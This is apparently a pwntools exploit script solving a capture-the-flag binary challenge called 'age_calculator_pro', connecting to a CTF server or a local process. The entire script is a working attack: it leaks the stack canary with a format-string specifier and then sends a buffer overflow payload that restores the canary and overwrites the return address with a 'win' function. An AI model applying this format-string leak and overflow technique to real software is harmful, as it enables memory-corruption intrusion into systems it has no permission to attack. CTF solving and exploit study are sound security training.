from pwn import *

elf = context.binary = ELF('./age_calculator_pro')
context.terminal = ['tmux', 'splitw', '-h']
if args.REMOTE:
    conn = remote("agecalculatorpro.challs.olicyber.it", 38103)
elif args.GDB:
    conn = gdb.debug([elf.path], gdbscript='''
    b main
    c
    ''')
else:
    conn = elf.process()


win = p64(0x4011F6)
p = b'%17$p'
conn.recvuntil(b'name?')
conn.sendline(p)
conn.recvline()
canary = conn.recvuntil(b',')[:-1]
canary = p64(int(canary.decode(), 16))
conn.recvuntil(b'year?')
conn.sendline(b'a'*72 + canary + b'a'*8 + win)



conn.interactive()